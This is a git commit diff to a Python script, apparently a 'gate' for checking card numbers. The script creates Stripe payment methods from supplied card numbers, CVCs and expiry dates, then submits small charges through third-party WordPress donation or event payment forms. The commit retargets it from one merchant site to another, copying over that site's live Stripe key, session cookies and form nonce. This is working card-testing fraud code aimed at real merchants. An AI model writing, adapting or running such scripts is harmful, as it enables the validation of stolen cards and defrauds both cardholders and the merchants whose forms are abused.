81a84de9fd8812e740ec4b5687e54e8f3d3095f0
Daokhaosaard13 <daokhaosaard13@gmail.com>
2025-01-04 04:04:50 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -28,31 +28,32 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+card-element&referrer=https%3A%2F%2Fbenidormevents.com&time_on_page=210818&key=pk_live_51MnlD9BLnG0DgrS7dg4xwTw7EJPH5l3oBUk9sVl3x7MFDTVXdayD9ilvN72iuWvfOhzzJbpP2xZ4ZMMj8UvMoZpV00ndaL2EFc'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+card-element&referrer=https%3A%2F%2Fmarketingclub-unisg.com&time_on_page=67532&key=pk_live_51JhFP2DsiWC9w1X6eNh9YIjDIalgt2GZksUL5X7tBCzb83GIuI9ynHUDVyTbr3wqm8qHMLoR1a3MPjdzBLt4LVLg007QpZkhQH'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    'PHPSESSID': '1a56f275fbe4975c11b5b2574952dd7a',
-	    '_ga_PJ9MDRD997': 'GS1.1.1735920393.1.0.1735920393.0.0.0',
-	    '_ga': 'GA1.1.1846511171.1735920393',
-	    'cookieyes-consent': 'consentid:TGVWbW9zOXZmUG1CcXdkSGVkaEtkb2R0enNRZVVNMWg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes',
-	    '__stripe_mid': '38235fd5-3f79-4ac7-a041-c2fcee1efadab88319',
-	    '__stripe_sid': 'd8771e80-f795-4c14-9289-4cc6b9659e9aa327c0',
+	    'asp_transient_id': '9240979747b7c4ab64e6f9ddb366f8c0',
+	    '_gid': 'GA1.2.1186890321.1735937615',
+	    '_ga': 'GA1.1.297284431.1735937615',
+	    '__stripe_mid': '8d49cdf7-33f2-40c6-93c7-6404caaddda6c19505',
+	    '__stripe_sid': '322cf1ec-1053-468a-aade-6dd02a8e44776634c1',
+	    '_gali': 'fluentform_19',
+	    '_ga_R9LQEKW8FB': 'GS1.1.1735937615.1.1.1735937656.0.0.0',
 	}
 	
 	headers = {
-	    'authority': 'benidormevents.com',
-	    'accept': 'application/json, text/javascript, */*; q=0.01',
+	    'authority': 'marketingclub-unisg.com',
+	    'accept': '*/*',
 	    'accept-language': 'en-US,en;q=0.9',
 	    'cache-control': 'no-cache',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': 'PHPSESSID=1a56f275fbe4975c11b5b2574952dd7a; _ga_PJ9MDRD997=GS1.1.1735920393.1.0.1735920393.0.0.0; _ga=GA1.1.1846511171.1735920393; cookieyes-consent=consentid:TGVWbW9zOXZmUG1CcXdkSGVkaEtkb2R0enNRZVVNMWg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes; __stripe_mid=38235fd5-3f79-4ac7-a041-c2fcee1efadab88319; __stripe_sid=d8771e80-f795-4c14-9289-4cc6b9659e9aa327c0',
-	    'origin': 'https://benidormevents.com',
+	    # 'cookie': 'asp_transient_id=9240979747b7c4ab64e6f9ddb366f8c0; _gid=GA1.2.1186890321.1735937615; _ga=GA1.1.297284431.1735937615; __stripe_mid=8d49cdf7-33f2-40c6-93c7-6404caaddda6c19505; __stripe_sid=322cf1ec-1053-468a-aade-6dd02a8e44776634c1; _gali=fluentform_19; _ga_R9LQEKW8FB=GS1.1.1735937615.1.1.1735937656.0.0.0',
+	    'origin': 'https://marketingclub-unisg.com',
 	    'pragma': 'no-cache',
-	    'referer': 'https://benidormevents.com/payments',
+	    'referer': 'https://marketingclub-unisg.com/events/action-learning-in-retail-workshop/',
 	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -63,21 +64,22 @@ def Tele(ccx):
 	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
-	data = {
-	    'action': 'wp_full_stripe_inline_payment_charge',
-	    'wpfs-form-name': 'MakeAPayment',
-	    'wpfs-form-get-parameters': '%7B%7D',
-	    'wpfs-custom-amount-unique': '1',
-	    'wpfs-custom-input[]': [
-	        '1',
-	        '1',
-	        '10080',
-	    ],
-	    'wpfs-card-holder-email': 'rodamuser09@gmail.com',
-	    'wpfs-card-holder-name': 'Rodam User',
-	    'wpfs-stripe-payment-method-id': pm,
+	params = {
+	    't': '1735937684974',
 	}
 	
-	r2 = requests.post('https://benidormevents.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
+	data = {
+	    'data': '__fluent_form_embded_post_id=1053&_fluentform_19_fluentformnonce=ee402ad04b&_wp_http_referer=%2Fevents%2Faction-learning-in-retail-workshop%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser07%40gmail.com&description=BA&checkbox%5B%5D=No&dropdown=Pay%20now%20with%20card&payment_input=1&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
+	    'action': 'fluentform_submit',
+	    'form_id': '19',
+	}
+	
+	r2 = requests.post(
+	    'https://marketingclub-unisg.com/wp-admin/admin-ajax.php',
+	    params=params,
+	    cookies=cookies,
+	    headers=headers,
+	    data=data,
+	)
 	
 	return (r2.json())
